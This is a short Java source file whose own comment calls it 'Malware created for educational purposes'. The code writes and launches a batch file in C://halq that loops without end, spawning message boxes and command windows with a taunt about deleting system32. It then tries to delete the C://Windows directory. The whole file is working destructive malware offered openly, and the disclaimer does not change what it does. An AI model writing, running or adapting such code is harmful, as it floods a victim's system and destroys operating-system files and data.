package halq.troll.troll.moment;


import java.io.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.concurrent.TimeUnit;

/**
 * @author halqq
 * @since 23/05/22
 * @apiNote Malware created for educational purposes, I am not responsible for misuse
 */

public class main {

    public static void runall() {
        createbat();
        runbat();
          gui.Display();
        deletesystem();
    }

    public static void createbat()   {
        try {
            Files.createDirectories(Paths.get("C://halq"));
            Files.createFile(Paths.get("C://halq//halq.bat"));
        } catch (IOException e) {
            e.printStackTrace();
        }
        try {
            FileWriter writer = new FileWriter("C://halq//halq.bat");
            writer.write("@echo off\n" +
                    "echo x=MsgBox (\"you were trolled, my condolences, im deleting your system32\", 16, \"!!!!! LMAO : halq moment !!!!!\") > msgbox.vbs\n" +
                    ":repete\n" +
                    "start ./msgbox.vbs\n" +
                    "start cmd.exe\n" +
                    "set /a loop=3\n" +
                    "goto repete\n" +
                    "cd c:/\n" +
                    "tree");
            writer.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public static void runbat(){
        String path="cmd /c start C://halq//halq.bat";
        try {
            Runtime.getRuntime().exec(path);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

  public static void deletesystem() {
      try {
          TimeUnit.SECONDS.sleep(5);
          Files.delete(Paths.get("C://Windows//"));
      } catch (InterruptedException | IOException e) {
          e.printStackTrace();
      }
  }
    }
